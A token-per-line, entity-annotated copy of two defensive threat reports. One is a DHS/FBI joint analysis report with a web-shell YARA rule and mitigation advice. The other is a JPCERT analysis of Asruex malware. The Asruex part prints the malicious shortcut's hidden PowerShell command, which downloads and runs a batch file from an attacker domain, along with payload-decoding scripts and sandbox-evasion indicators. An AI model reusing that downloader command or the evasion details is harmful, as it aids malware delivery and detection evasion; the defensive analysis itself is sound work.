Powershell  B_malware.backdoor
backdoor  I

Quedagh B_malware.drop

Sandworm  B_malware.backdoor

SEADADDY  B_malware.backdoor

Seaduke B_malware.backdoor

SEDKIT  B_malware.backdoor

SEDNIT  B_malware.backdoor

Skipper B_malware.backdoor

Sofacy  B_malware.backdoor

SOURFACE  B_malware.backdoor

SYNful  B_malware.drop
Knock I

Tiny  B_malware.backdoor
Baron I

Tsar  B_malware.backdoor
Team  I

twain_64.dll  B_malware.backdoor
(
64-bit  B_malware.backdoor
X-Agent I
implant I
)

VmUpgradeHelper.exe B_malware.drop
(
X-Tunnel  B_malware.drop
implant I
)

Waterbug  B_malware.drop

X-Agent B_malware.backdoor

Technical
Details

Indicators
of
Compromise
(
IOCs
)

IOCs
associated
with
RIS
cyber
actors
are
provided
within
the
accompanying
.csv
and
.stix
files
of
JAR-16-20296
.

Yara
Signature
rule
PAS_TOOL_PHP_WEB_KIT
meta
:
description
=
'
PAS
TOOL
PHP
WEB
KIT
FOUND
'
strings
:
$php
=
'
<?php
'
$base64decode
=
/\='base'\.\(\d+\*\d+\)\.'_de'\.'code'/
$strreplace
=
'
(
str_replace(
'
$md5
=
'
.substr(md5(strrev(
'
$gzinflate
=
'
gzinflate
'
$cookie
=
'
_COOKIE
'
$isset
=
'
isset
'
condition
:
(
filesize
>
20KB
and
filesize
<
22KB
)
and
#cookie
==
2
and
#isset
==
3
and
all
of
them

Actions
to
Take
Using
Indicators

DHS
recommends
that
network
administrators
review
the
IP
addresses
,
file
hashes
,
and
Yara
signature
provided
and
add
the
IPs
to
their
watchlist
to
determine
whether
malicious
activity
has
been
observed
within
their
organizations
.

The
review
of
network
perimeter
netflow
or
firewall
logs
will
assist
in
determining
whether
your
network
has
experienced
suspicious
activity
.

When
reviewing
network
perimeter
logs
for
the
IP
addresses
,
organizations
may
find
numerous
instances
of
these
IPs
attempting
to
connect
to
their
systems
.

Upon
reviewing
the
traffic
from
these
IPs
,
some
traffic
may
correspond
to
malicious
activity
,
and
some
may
correspond
to
legitimate
activity
.

Some
traffic
that
may
appear
legitimate
is
actually
malicious
,
such
as
vulnerability
scanning
or
browsing
of
legitimate
public
facing
services
(
e.g.
,
HTTP
,
HTTPS
,

FTP
)
.

Connections
from
these
IPs
may
be
performing
vulnerability
scans
attempting
to
identify
websites
that
are
vulnerable
to
cross-site
scripting
(
XSS
)
or
Structured
Query
Language
(
SQL
)
injection
attacks
.

If
scanning
identified
vulnerable
sites
,
attempts
to
exploit
the
vulnerabilities
may
be
experienced
.

Network
administrators
are
encouraged
to
check
their
public-facing
websites
for
the
malicious
file
hashes
.

System
owners
are
also
advised
to
run
the
Yara
signature
on
any
system
that
is
suspected
to
have
been
targeted
by
RIS
actors
.

Threats
from
IOCs

Malicious
actors
may
use
a
variety
of
methods
to
interfere
with
information
systems
.

Some
methods
of
attack
are
listed
below
.

Guidance
provided
is
applicable
to
many
other
computer
networks
.

•
Injection
Flaws
are
broad
web
application
attack
techniques
that
attempt
to
send
commands
to
a
browser
,
database
,
or
other
system
,
allowing
a
regular
user
to
control
behavior
.

The
most
common
example
is
SQL
injection
,
which
subverts
the
relationship
between
a
webpage
and
its
supporting
database
,
typically
to
obtain
information
contained
inside
the
database
.

Another
form
is
command
injection
,
where
an
untrusted
user
is
able
to
send
commands
to
operating
systems
supporting
a
web
application
or
database
.

See
the
United
States
Computer
Emergency
Readiness
Team
(
US-CERT
)
Publication
on
SQL
Injection
for
more
information
.

•
Cross-site
scripting
(
XSS
)
vulnerabilities
allow
threat
actors
to
insert
and
execute
unauthorized
code
in
web
applications
.

Successful
XSS
attacks
on
websites
can
provide
the
attacker
unauthorized
access
.

For
prevention
and
mitigation
strategies
against
XSS
,
see
US-CERT's
Alert
on
Compromised
Web
Servers
and
Web
Shells
.

•
Server
vulnerabilities
may
be
exploited
to
allow
unauthorized
access
to
sensitive
information
.

An
attack
against
a
poorly
configured
server
may
allow
an
adversary
access
to
critical
information
including
any
websites
or
databases
hosted
on
the
server
.

See
US-
CERT's
Tip
on
Website
Security
for
additional
information
.

Recommended
Mitigations

Commit
to
Cybersecurity
Best
Practices

A
commitment
to
good
cybersecurity
and
best
practices
is
critical
to
protecting
networks
and
systems
.

Here
are
some
questions
you
may
want
to
ask
your
organization
to
help
prevent
and
mitigate
against
attacks
.

1
.
Backups
:
Do
we
backup
all
critical
information
?

Are
the
backups
stored
offline
?

Have
we
tested
our
ability
to
revert
to
backups
during
an
incident
?

2
.
Risk
Analysis
:
Have
we
conducted
a
cybersecurity
risk
analysis
of
the
organization
?

3
.
Staff
Training
:
Have
we
trained
staff
on
cybersecurity
best
practices
?

4
.
Vulnerability
Scanning
&
Patching
:
Have
we
implemented
regular
scans
of
our
network
and
systems
and
appropriate
patching
of
known
system
vulnerabilities
?

5
.
Application
Whitelisting
:
Do
we
allow
only
approved
programs
to
run
on
our
networks
?

6
.
Incident
Response
:
Do
we
have
an
incident
response
plan
and
have
we
practiced
it
?

7
.
Business
Continuity
:
Are
we
able
to
sustain
business
operations
without
access
to
certain
systems
?

For
how
long
?

Have
we
tested
this
?

8
.
Penetration
Testing
:
Have
we
attempted
to
hack
into
our
own
systems
to
test
the
security
of
our
systems
and
our
ability
to
defend
against
attacks
?

Top
Seven
Mitigation
Strategies

DHS
encourages
network
administrators
to
implement
the
recommendations
below
,
which
can
prevent
as
many
as
85
percent
of
targeted
cyber-attacks
.

These
strategies
are
common
sense
to
many
,
but
DHS
continues
to
see
intrusions
because
organizations
fail
to
use
these
basic
measures
.

1
.
Patch
applications
and
operating
systems
–
Vulnerable
applications
and
operating
systems
are
the
targets
of
most
attacks
.

Ensuring
these
are
patched
with
the
latest
updates
greatly
reduces
the
number
of
exploitable
entry
points
available
to
an
attacker
.

Use
best
practices
when
updating
software
and
patches
by
only
downloading
updates
from
authenticated
vendor
sites
.

2
.
Application
whitelisting
–
Whitelisting
is
one
of
the
best
security
strategies
because
it
allows
only
specified
programs
to
run
while
blocking
all
others
,
including
malicious
software
.

3
.
Restrict
administrative
privileges
–
Threat
actors
are
increasingly
focused
on
gaining
control
of
legitimate
credentials
,
especially
those
associated
with
highly
privileged
accounts
.

Reduce
privileges
to
only
those
needed
for
a
user's
duties
.

Separate
administrators
into
privilege
tiers
with
limited
access
to
other
tiers
.

4
.
Network
Segmentation
and
Segregation
into
Security
Zones
–
Segment
networks
into
logical
enclaves
and
restrict
host-to-host
communications
paths
.

This
helps
protect
sensitive
information
and
critical
services
and
limits
damage
from
network
perimeter
breaches
.

5
.
Input
validation
–
Input
validation
is
a
method
of
sanitizing
untrusted
user
input
provided
by
users
of
a
web
application
,
and
may
prevent
many
types
of
web
application
security
flaws
,
such
as
SQLi
,
XSS
,
and
command
injection
.

6
.
File
Reputation
–
Tune
Anti-Virus
file
reputation
systems
to
the
most
aggressive
setting
possible;
some
products
can
limit
execution
to
only
the
highest
reputation
files
,
stopping
a
wide
range
of
untrustworthy
code
from
gaining
control
.

7
.
Understanding
firewalls
–
When
anyone
or
anything
can
access
your
network
at
any
time
,
your
network
is
more
susceptible
to
being
attacked
.

Firewalls
can
be
configured
to
block
data
from
certain
locations
(
IP
whitelisting
)
or
applications
while
allowing
relevant
and
necessary
data
through
.

Responding
to
Unauthorized
Access
to
Networks

Implement
your
security
incident
response
and
business
continuity
plan
.

It
may
take
time
for
your
organization's
IT
professionals
to
isolate
and
remove
threats
to
your
systems
and
restore
normal
operations
.

Meanwhile
,
you
should
take
steps
to
maintain
your
organization's
essential
functions
according
to
your
business
continuity
plan
.

Organizations
should
maintain
and
regularly
test
backup
plans
,
disaster
recovery
plans
,
and
business
continuity
procedures
.

Contact
DHS
or
law
enforcement
immediately
.

We
encourage
you
to
contact
DHS
NCCIC
(
NCCICCustomerService@hq.dhs.gov
or
888-282-0870
)
,
the
FBI
through
a
local
field
office
or
the
FBI's
Cyber
Division
(
CyWatch@ic.fbi.gov
or
855-292-3937
)
to
report
an
intrusion
and
to
request
incident
response
resources
or
technical
assistance
.

Detailed
Mitigation
Strategies

Protect
Against
SQL
Injection
and
Other
Attacks
on
Web
Services

Routinely
evaluate
known
and
published
vulnerabilities
,
perform
software
updates
and
technology
refreshes
periodically
,
and
audit
external-facing
systems
for
known
Web
application
vulnerabilities
.

Take
steps
to
harden
both
Web
applications
and
the
servers
hosting
them
to
reduce
the
risk
of
network
intrusion
via
this
vector.1

•
Use
and
configure
available
firewalls
to
block
attacks
.

•
Take
steps
to
further
secure
Windows
systems
such
as
installing
and
configuring
Microsoft's
Enhanced
Mitigation
Experience
Toolkit
(
EMET
)
and
Microsoft
AppLocker
.

•
Monitor
and
remove
any
unauthorized
code
present
in
any
www
directories
.

•
Disable
,
discontinue
,
or
disallow
the
use
of
Internet
Control
Message
Protocol
(
ICMP
)
and
Simple
Network
Management
Protocol
(
SNMP
)
and
response
to
these
protocols
as
much
as
possible
.

•
Remove
non-required
HTTP
verbs
from
Web
servers
as
typical
Web
servers
and
applications
only
require
GET
,
POST
,
and
HEAD
.

•
Where
possible
,
minimize
server
fingerprinting
by
configuring
Web
servers
to
avoid
responding
with
banners
identifying
the
server
software
and
version
number
.

•
Secure
both
the
operating
system
and
the
application
.

•
Update
and
patch
production
servers
regularly
.

•
Disable
potentially
harmful
SQL-stored
procedure
calls
.

•
Sanitize
and
validate
input
to
ensure
that
it
is
properly
typed
and
does
not
contain
escaped
code
.

•
Consider
using
type-safe
stored
procedures
and
prepared
statements
.

•
Perform
regular
audits
of
transaction
logs
for
suspicious
activity
.

•
Perform
penetration
testing
against
Web
services
.

•
Ensure
error
messages
are
generic
and
do
not
expose
too
much
information
.

1
http://msdn.microsoft.com/en-us/library/ff648653.aspx
.
Web
site
last
accessed
April
11
,
2016
.

Phishing  B_malware.backdoor
and
spearphishing B_malware.backdoor

Implement
a
Sender
Policy
Framework
(
SPF
)
record
for
your
organization's
Domain
Name
System
(
DNS
)
zone
file
to
minimize
risks
relating
to
the
receipt
of
spoofed
messages
.

•
Educate
users
to
be
suspicious
of
unsolicited
phone
calls
,
social
media
interactions
,
or
email
messages
from
individuals
asking
about
employees
or
other
internal
information
.

If
an
unknown
individual
claims
to
be
from
a
legitimate
organization
,
try
to
verify
his
or
her
identity
directly
with
the
company
.

•
Do
not
provide
personal
information
or
information
about
your
organization
,
including
its
structure
or
networks
,
unless
you
are
certain
of
a
person's
authority
to
have
the
information
.

•
Do
not
reveal
personal
or
financial
information
in
social
media
or
email
,
and
do
not
respond
to
solicitations
for
this
information
.

This
includes
following
links
sent
in
email
.

•
Pay
attention
to
the
URL
of
a
website
.

Malicious
websites
may
look
identical
to
a
legitimate
site
,
but
the
URL
often
includes
a
variation
in
spelling
or
a
different
domain
than
the
valid
website
(
e.g.
,
.com
vs
.
.net
)
.

If
you
are
unsure
whether
an
email
request
is
legitimate
,
try
to
verify
it
by
contacting
the
company
directly
.

Do
not
use
contact
information
provided
on
a
website
connected
to
the
request
;
instead
,
check
previous
statements
for
contact
information
.

Information
about
known
phishing
attacks
is
also
available
online
from
groups
such
as
the
Anti-Phishing
Working
Group
(
http://www.antiphishing.org B_url.normal
)
.

•
Take
advantage
of
anti-phishing
features
offered
by
your
email
client
and
web
browser
.

•
Patch
all
systems
for
critical
vulnerabilities
,
prioritizing
timely
patching
of
software
that
processes
Internet
data
,
such
as
web
browsers
,
browser
plugins
,
and
document
readers
.

Permissions
,
Privileges
,
and
Access
Controls
•
Reduce
privileges
to
only
those
needed
for
a
user's
duties
.

•
Restrict
users
'
ability
(
permissions
)
to
install
and
run
unwanted
software
applications
,
and
apply
the
principle
of
'
Least
Privilege
'
to
all
systems
and
services
.

Restricting
these
privileges
may
prevent
malware
from
running
or
limit
its
capability
to
spread
through
the
network
.

•
Carefully
consider
the
risks
before
granting
administrative
rights
to
users
on
their
own
machines
.

•
Scrub
and
verify
all
administrator
accounts
regularly
.

•
Configure
Group
Policy
to
restrict
all
users
to
only
one
login
session
,
where
possible
.

•
Enforce
secure
network
authentication
where
possible
.

Instruct
administrators
to
use
non-privileged
accounts
for
standard
functions
such
as
Web
browsing
or
checking
Web
mail
.

•
Segment
networks
into
logical
enclaves
and
restrict
host-to-host
communication
paths
.

Containment
provided
by
enclaving
also
makes
incident
cleanup
significantly
less
costly
.

•
Configure
firewalls
to
disallow
RDP
traffic
coming
from
outside
of
the
network
boundary
,
except
for
in
specific
configurations
such
as
when
tunneled
through
a
secondary
VPN
with
lower
privileges
.

•
Audit
existing
firewall
rules
and
close
all
ports
that
are
not
explicitly
needed
for
business
.

Specifically
,
carefully
consider
which
ports
should
be
connecting
outbound
versus
inbound
.

•
Enforce
a
strict
lockout
policy
for
network
users
and
closely
monitor
logs
for
failed
login
activity
.

This
can
be
indicative
of
failed
intrusion
activity
.

If
remote
access
between
zones
is
an
unavoidable
business
need
,
log
and
monitor
these
connections
closely
.

In
environments
with
a
high
risk
of
interception
or
intrusion
,
organizations
should
consider
supplementing
password
authentication
with
other
forms
of
authentication
such
as
challenge
/
response
or
multifactor
authentication
using
biometric
or
physical
tokens
.

Credentials
•
Enforce
a
tiered
administrative
model
with
dedicated
administrator
workstations
and
separate
administrative
accounts
that
are
used
exclusively
for
each
tier
to
prevent
tools
,
such
as
Mimikatz
,
for
credential
theft
from
harvesting
domain-level
credentials
.

Implement
multi-factor
authentication
(
e.g.
,
smart
cards
)
or
at
minimum
ensure
users
choose
complex
passwords
that
change
regularly
.

•
Be
aware
that
some
services
(
e.g.
,
FTP
,
telnet
,
and
.rlogin
)
transmit
user
credentials
in
clear
text
.

Minimize
the
use
of
these
services
where
possible
or
consider
more
secure
alternatives
.

•
Properly
secure
password
files
by
making
hashed
passwords
more
difficult
to
acquire
.

Password
hashes
can
be
cracked
within
seconds
using
freely
available
tools
.

Consider
restricting
access
to
sensitive
password
hashes
by
using
a
shadow
password
file
or
equivalent
on
UNIX
systems
.

•
Replace
or
modify
services
so
that
all
user
credentials
are
passed
through
an
encrypted
channel
.

•
Avoid
password
policies
that
reduce
the
overall
strength
of
credentials
.

Policies
to
avoid
include
lack
of
password
expiration
date
,
lack
of
lockout
policy
,
low
or
disabled
password
complexity
requirements
,
and
password
history
set
to
zero
.

•
Ensure
that
users
are
not
re-using
passwords
between
zones
by
setting
policies
and
conducting
regular
audits
.

•
Use
unique
passwords
for
local
accounts
for
each
device
.

Logging
Practices

•
Ensure
event
logging
(
applications
,
events
,
login
activities
,
security
attributes
,
etc
.
)
is
turned
on
or
monitored
for
identification
of
security
issues
.

•
Configure
network
logs
to
provide
enough
information
to
assist
in
quickly
developing
an
accurate
determination
of
a
security
incident
.

•
Upgrade
PowerShell
to
new
versions
with
enhanced
logging
features
and
monitor
the
logs
to
detect
usage
of
PowerShell
commands
,
which
are
often
malware-related
.

•
Secure
logs
,
potentially
in
a
centralized
location
,
and
protect
them
from
modification
.

•
Prepare
an
incident
response
plan
that
can
be
rapidly
implemented
in
case
of
a
cyber
intrusion
.

How
to
Enhance
Your
Organization's
Cybersecurity
Posture

DHS
offers
a
variety
of
resources
for
organizations
to
help
recognize
and
address
their
cybersecurity
risks
.

Resources
include
discussion
points
,
steps
to
start
evaluating
a
cybersecurity
program
,
and
a
list
of
hands-on
resources
available
to
organizations
.
For
a
list
of
services
,
visit
https://www.us-cert.gov/ccubedvp  B_url.normal
.

Other
resources
include
:
•
The
Cyber
Security
Advisors
(
CSA
)
program
bolsters
cybersecurity
preparedness
,
risk
mitigation
,
and
incident
response
capabilities
of
critical
infrastructure
entities
and
more
closely
aligns
them
with
the
Federal
Government
.

CSAs
are
DHS
personnel
assigned
to
districts
throughout
the
country
and
territories
,
with
at
least
one
advisor
in
each
of
the
10
CSA
regions
,
which
mirror
the
Federal
Emergency
Management
Agency
regions
.

For
more
information
,
email
cyberadvisor@hq.dhs.gov
.

•
Cyber
Resilience
Review
(
CRR
)
is
a
no-cost
,
voluntary
assessment
to
evaluate
and
enhance
cybersecurity
within
critical
infrastructure
sectors
,
as
well
as
state
,
local
,
tribal
,
and
territorial
governments
.

The
goal
of
the
CRR
is
to
develop
an
understanding
and
measurement
of
key
cybersecurity
capabilities
to
provide
meaningful
indicators
of
an
entity's
operational
resilience
and
ability
to
manage
cyber
risk
to
critical
services
during
normal
operations
and
times
of
operational
stress
and
crisis
.

Visit
https://www.cert.org/resilience/rmm.html  B_url.normal
to
learn
more
about
the
CERT
Resilience
Management
Model
.

•
Enhanced
Cybersecurity
Services
(
ECS
)
helps
critical
infrastructure
owners
and
operators
protect
their
systems
by
sharing
sensitive
and
classified
cyber
threat
information
with
Commercial
Service
Providers
(
CSPs
)
and
Operational
Implementers
(
OIs
)
.

CSPs
then
use
the
cyber
threat
information
to
protect
CI
customers
.

OIs
use
the
threat
information
to
protect
internal
networks
.

For
more
information
,
email
ECS_Program@hq.dhs.gov
.

•
The
Cybersecurity
Information
Sharing
and
Collaboration
Program
(
CISCP
)
is
a
voluntary
information-sharing
and
collaboration
program
between
and
among
critical
infrastructure
partners
and
the
Federal
Government
.

For
more
information
,
email
CISCP@us-cert.gov
.

•
The
Automated
Indicator
Sharing
(
AIS
)
initiative
is
a
DHS
effort
to
create
a
system
where
as
soon
as
a
company
or
federal
agency
observes
an
attempted
compromise
,
the
indicator
will
be
shared
in
real
time
with
all
of
our
partners
,
protecting
them
from
that
particular
threat
.

That
means
adversaries
can
only
use
an
attack
once
,
which
increases
their
costs
and
ultimately
reduces
the
prevalence
of
cyber-attacks
.

While
AIS
will
not
eliminate
sophisticated
cyber
threats
,
it
will
allow
companies
and
federal
agencies
to
concentrate
more
on
them
by
clearing
away
less
sophisticated
attacks
.

AIS
participants
connect
to
a
DHS-managed
system
in
the
NCCIC
that
allows
bidirectional
sharing
of
cyber
threat
indicators
.

A
server
housed
at
each
participant's
location
allows
each
to
exchange
indicators
with
the
NCCIC
.

Participants
will
not
only
receive
DHS-developed
indicators
,
but
can
share
indicators
they
have
observed
in
their
own
network
defense
efforts
,
which
DHS
will
then
share
with
all
AIS
participants
.
For
more
information
,
visit
https://www.dhs.gov/ais B_url.normal
.

•
The
Cybersecurity
Framework
(
Framework
)
,
developed
by
the
National
Institute
of
Standards
and
Technology
(
NIST
)
in
collaboration
with
the
public
and
private
sectors
,
is
a
tool
that
can
improve
the
cybersecurity
readiness
of
entities
.

The
Framework
enables
entities
,
regardless
of
size
,
degree
of
cyber
risk
,
or
cyber
sophistication
,
to
apply
principles
and
best
practices
of
risk
management
to
improve
the
security
and
resiliency
of
critical
infrastructure
.

The
Framework
provides
standards
,
guidelines
,
and
practices
that
are
working
effectively
today
.

It
consists
of
three
parts—the
Framework
Core
,
the

Framework
Profile
,
and
Framework
Implementation
Tiers
—
and
emphasizes
five
functions
:
Identify
,
Protect
,
Detect
,
Respond
,
and
Recover
.
Use
of
the
Framework
is
strictly
voluntary
.

For
more
information
,
visit
https://www.nist.gov/cyberframework B_url.normal
or
email
cyberframework@nist.gov
.

Contact
Information

Recipients
of
this
report
are
encouraged
to
contribute
any
additional
information
that
they
may
have
related
to
this
threat
.

Include
the
JAR
reference
number
(
JAR-16-20296A
)
in
the
subject
line
of
all
email
correspondence
.

For
any
questions
related
to
this
report
,
please
contact
NCCIC
or
the
FBI
.

NCCIC
:

Phone
:
+1-888-282-0870

Email
:
NCCICCustomerService@hq.dhs.gov

FBI
:

Phone
:
+1-855-292-3937

Email
:
cywatch@ic.fbi.gov

Feedback

NCCIC
continuously
strives
to
improve
its
products
and
services
.

You
can
help
by
answering
a
few
short
questions
about
this
product
at
the
following
URL
:
https://www.us-cert.gov/forms/feedback  B_url.normal
.
Asruex B_malware.drop
:
Malware
Infecting
through
Shortcut
Files
blog.jpcert.or.jp/2016/06/asruex-malware-infecting-through-shortcut-files.html B_url.normal

JPCERT/CC
has
been
observing
malicious
shortcut
files
that
are
sent
as
email
attachments
to
a
limited
range
of
organisations
since
around
October
2015
.

When
this
shortcut
file
is
opened
,
the
host
will
be
infected
with
malware
called
'
Asruex B_malware.drop
'
.

The
malware
has
a
remote
controlling
function
,
and
attackers
sending
these
emails
seem
to
attempt
intruding
into
the
targets
'
network
using
the
malware
.

According
to
a
blog
article
by
Microsoft
,
the
malware
is
associated
with
an
attacker
group
identified
as
'
DarkHotel
'
(
Microsoft
calls
it
as
'
Dubnium
'
)
[1]
.

This
blog
entry
will
introduce
the
details
of
Asruex B_malware.drop
.

Infection
Mechanism
of
Asruex B_malware.drop

Figure
1
describes
the
chain
of
events
after
a
victim
opens
the
malicious
shortcut
file
until
the
host
gets
infected
with
Asruex B_malware.drop
.

Figure
1
:
Chain
of
events
after
a
victim
opens
the
malicious
shortcut
file
until
the
host
gets
infected
with
Asruex B_malware.drop

For
those
cases
that
JPCERT
/
CC
has
observed
,
when
the
shortcut
file
is
opened
,
a
downloader
is
downloaded
from
a
C&C
server
and
then
executed
.

The
downloader
then
downloads
Asruex B_malware.drop
from
another
C&C
server
,
which
is
then
executed
.

Detailed
behaviour
observed
in
each
phase
will
be
explained
in
the
next
section
.

Details
of
the
Shortcut
File

When
the
malicious
shortcut
file
is
opened
,
the
following
PowerShell
command
in
the
file
is
executed
.

powershell
-windowstyle
hidden
$c='(new-objectSystem.Net.WebClient).D'+'ownloadFile('''http://online-dropbox.com/online/a''','''$env:tmp\gst.bat''')';
Invoke-Expression
$c&%tmp%\gst.bat
'
%CD%
'

The
above
PowerShell
command
downloads
a
file
from
the
specified
URL
,
and
it
is
saved
as
a
batch
file
to
be
executed
.

The
batch
file
contains
the
following
commands
,
which
execute
PowerShell
scripts
(
marked
in
red
)
.

echo
powershell
-Enc
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUw
...
chcp
65001
cd
'
%tmp%
'
start
winword
'
article_draft.docx
'
copy
'
article_draft.docx
'
'
%1
'
del
/f
'
%1\*.*.lnk
'
echo
powershell
-Enc
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMA
...
'
%tmp%\dwm.exe
'

When
the
batch
file
is
executed
,
a
Windows
executable
file
(
a
downloader
)
and
a
dummy
file
for
display
will
be
downloaded
from
a
C&C
server
,
saved
in
%TEMP%
folder
and
then
executed
.

Those
decoy
documents
are
written
in
Japanese
,
but
some
are
also
in
Chinese
,
which
implies
that
the
target
for
this
attack
is
not
limited
to
Japanese
organisations
.

Details
of
the
Downloader

When
the
downloader
is
executed
,
it
downloads
a
.jpg
or
.gif
image
file
.

Encoded
Asruex B_malware.drop
is
contained
in
the
latter
part
of
the
image
file
.

The
downloader
decodes
it
and
then
executes
the
malware
.

Figure
2
:
An
Image
File
Containing
Encoded
Asruex B_malware.drop

Asruex B_malware.drop
contained
in
the
image
file
is
encoded
using
XOR
.

The
following
Python
script
is
used
for
decoding
the
encoded
data
of
the
image
file
.

The
size
of
the
encoded
data
is
specified
in
the
last
4
bytes
of
the
image
file
.

key
=
0x1D
#
Keys
may
vary
depending
on
the
sample
for
i
in
range(0,length)
:
buf[i]
=
chr(ord(buf[i]
)
^
key
)

key
+=
0x5D
key
&=0xff

The
downloader
may
contain
an
encoded
executable
file
of
Process
Hacker
(
a
multi-function
task
manager
)
,
and
it
may
execute
the
Process
Hacker
if
an
anti-virus
software
is
detected
.

Anti-virus
software
such
as
by
Symantec
,

McAfee
and
Kaspersky
,
etc
.
,
are
detected
based
on
the
process
names
.

Details
of
Asruex B_malware.drop

Asruex B_malware.drop
is
a
kind
of
malware
that
communicates
with
the
C&C
server
over
HTTP
,
and
executes
the
command
received
through
the
communication
.

It
has
various
anti-analysis
features
such
as
preventing
the
malware
from
running
when
it
detects
a
virtual
machine
.

Please
refer
to
Appendix
A
for
conditions
which
Asruex
detects
a
virtual
machine
.

The
malware
is
also
capable
of
detecting
anti-virus
software
.

If
Asruex B_malware.drop
does
not
detect
a
virtual
machine
,
it
executes
one
of
the
following
executable
files
,
and
injects
a
DLL
file
which
is
contained
in
Asruex B_malware.drop
.

In
case
where
it
detects
anti-virus
software
,
Asruex B_malware.drop
generates
a
DLL
file
and
loads
it
to
itself
(
but
does
not
perform
DLL
injection
)
.

This
DLL
file
contains
the
core
functions
of
Asruex B_malware.drop
.

sdiagnhost.exe B_malware.drop
wksprt.exe B_malware.drop
taskhost.exe B_malware.drop
dwm.exe B_malware.drop
winrshost.exe B_malware.drop
wsmprovhost.exe B_malware.drop
ctfmon.exe B_malware.drop
explorer.exe B_malware.drop

The
DLL
injected
,
or
generated
and
loaded
,
sends
an
HTTP
request
to
a
dummy
host
.

If
it
receives
a
reply
of
status
code
that
is
100
or
greater
,
it
connects
to
an
actual
C&C
server
as
follows
:

GET
/table/list.php
?
a1=6fcadf059e54a19c7b96b0758a2d20a4396b85e77138dbaff3fddd04909de91
62a8910eab1141343492e90a78e75bfa7cafa3ed0a51740daa4cad36291e637074255217
–omitted-

HTTP/1.1

Connection
:
Keep-Alive

Content-Type
:
text/plain;
charset=utf-8

Accept
:
*/*

User-Agent
:
Mozilla/5.0
(
Windows
NT
5.1
)
AppleWebKit/537.36
(
KHTML
,
like
Gecko
)

Chrome/27.0.1453.116
Safari/537.36

Host
:
[host
name]

Asruex B_malware.drop
operates
based
on
the
configuration
information
stored
in
itself
.

The
configuration
Information
includes
C&C
servers
and
dummy
hosts
that
it
connects
to
,
and
also
version
information
and
a
key
to
decode
data
which
is
delivered
.

For
further
details
on
the
configuration
information
,
please
refer
to
Appendix
B
.

The
configuration
information
is
encoded
.

It
can
be
decoded
with
the
following
Python
code
:
3
/
11
(
config_size
,
)
=
struct.unpack('=I
'
,
data[offset:offset+4]
)
config_offset
=
offset
+
4
encode_config
=
data[config_offset:config_offset+config_size]
i
=
0
seed
=
config_size
*
2
//
It
does
not
necessarily
double
while
i
<
config_size
:
(
result
,
seed
)
=
rand_with_seed(seed
)
result
&=
0xff
decode_data.append(chr(ord(encode_config[i]
)
^
result
)
)
i
+=
1
decode_config
=
'
'
.join(decode_data
)
(
decode_size
,
)
=
struct.unpack('=I
'
,
decode_config[config_size-4:config_size]
)
config
=
lznt1_decompress(decode_config
,
config_size
,
decode_size
)

Asruex B_malware.drop
executes
commands
that
are
received
from
a
C&C
server
.

Commands
that
are
possibly
executed
are
listed
in
Table
1
.

Most
of
the
commands
are
used
for
collecting
information
,
but
some
are
for
downloading
DLL
files
(
AdvProv.dll
)
from
C&C
servers
and
for
executing
them
.

AdvProv.dll
is
a
plug-in
to
expand
functions
of
Asruex B_malware.drop
.

Table
1
:
Commands
used
by
Asruex B_malware.drop

Command

Function

Collect
information
of
infected
hosts

Obtain
process
list

Obtain
file
list

Change
waiting
time

Obtain
version
information

Uninstall

Obtain
folder
list

Load
DLL

Execute
external
DLL
(
AdvProv.dll
)

Details
of
AdvProv.dll

AdvProv.dll
is
encrypted
using
XOR
and
3DES
.

Decryption
key
is
calculated
based
on
the
destination
URL
and
the
encoding
key
of
the
configuration
information
.

Asruex B_malware.drop
downloads
a
DLL
,
loads
it
into
the
memory
and
executes
DLL's
export
function
,
Get_CommandProc
.

AdvProv.dll
adds
the
following
commands
to
Asruex B_malware.drop
:

Table
2
:
Asruex B_malware.drop
Commands
added
by

AdvProv.dll

Command

Function

Download

Copy
a
file

Change
a
file
name

Change
file
time

Delete
a
file

Terminate
a
process

Search
a
registry

Show
a
registry
entry

Create
a
registry
entry

Show
a
registry
entry

Delete
a
registry
entry

Update

Download
and
execute
a
file

Samples
of
AdvProv.dll
that
JPCERT/CC
has
observed
had
the
listed
functions
.

However
,
there
may
be
some
other
versions
with
different
functions
.

Summary

Asruex B_malware.drop
is
a
relatively
new
kind
of
malware
that
has
been
seen
since
around
October
2015
.

It
is
likely
that
targeted
attacks
using
Asruex B_malware.drop
will
continue
.

Hash
values
of
artifacts
demonstrated
in
this
article
are
described
in
Appendix B_hash
C I
.

Also
,
destination
URLs
confirmed
by
JPCERT
/
CC
are
listed
in
Appendix B_url.cncsvr
D I
.

It
is
recommended
to
make
sure
that
the
hosts
you
use
are
not
accessing
these
URLs
.

Thanks
for
reading
.

-
Shusei
Tomonaga
(
Translated
by
Yukako
Uchida
)

Reference

[1]
Microsoft
-
Reverse-engineering
DUBNIUM
https://blogs.technet.microsoft.com/mmpc/2016/06/09/reverse-engineering-dubnium-2/ B_url.normal

Appendix
A
:
Conditions
where
Asurex
detects
an
analysis
environment

If
Asruex B_malware.drop
detects
itself
being
operated
in
an
environment
under
any
of
the
following
conditions
(
Table
A-1
to
A-6
)
,
it
recognises
that
it
is
an
analysis
environment
and
stops
running
.

Table
A-1
:
The
user
matches
the
computer
name
and
user
name
as
listed
.

Table
A-2
:
Listing
up
the
loaded
modules
,
and
if
the
listed
functions
are
found
to
be
exported
.

Table
A-3
:
The
listed
file
names
are
found
.

Table
A-4
:
The
listed
process
names
are
running
.

Table
A-5
:
Listing
up
the
process
modules
that
are
running
,
and
the
module
version
matches
the
combination
listed
.

Table
A-6
:
The
disk
name
contains
the
listed
strings
.

Table
A-1
:
Detectable
Combination
of
Computer
Name
and
User
Name

Computer
Name

User
Name

BRBRB-D8FB22AF1
antonie

ANTONY-PC

Antony

TEQUILABOOMBOOM
janettedoe

HBXPENG

IOAVM

XANNY
makrorechner

Administrator

Administrator

NONE-DUSEZ58JO1

Administrator
rtrtrele

Administrator

HOME-OFF-D5F0AC

Dave

DELL-D3E64F7E26

Administrator

JONATHAN-C561E0

Administrator

HANS

IePorto

HanueleBaser

Administrator

Table
A-2
:
Detectable
Functions

Functions
_SbieDll_Hook@12
_SbieApi_QueeryProcessPath@28
hook_api

New2_CreateProcessInternalW@48

Table
A-3
:
Detectable
File

Names

File
Names
\\.\pipe\cuckoo
[System
Drive]:\cuckoo

Table
A-4
:

Detectable
Process

Names

Process
Names

Filemon.exe

Regmon.exe

Procmon.exe

Tcpview.exe
wireshark.exe
dumpcap.exe
regshot.exe
